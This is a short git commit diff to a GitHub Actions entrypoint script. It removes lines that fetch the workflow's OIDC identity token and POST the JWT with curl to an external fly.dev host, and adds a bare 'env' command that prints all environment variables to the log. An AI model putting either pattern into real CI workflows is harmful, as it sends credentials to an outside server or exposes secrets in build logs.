7c13b77988b77b9daa925469526134b2df32f177
Johnny Fredheim Horvi <johnny@horvi.no>
2024-11-07 06:59:54 +0100

    print env

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,11 +1,5 @@
 #!/bin/sh -l
 
-echo "Hello $1"
+echo "Hello!"
 
-payload=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=hookd")
-jwt=$(echo "$payload" | jq -r '.value')
-
-curl https://twilight-hill-6850.fly.dev --data "jwt=$jwt"
-
-time=$(date)
-echo "time=$time" >> $GITHUB_OUTPUT
+env
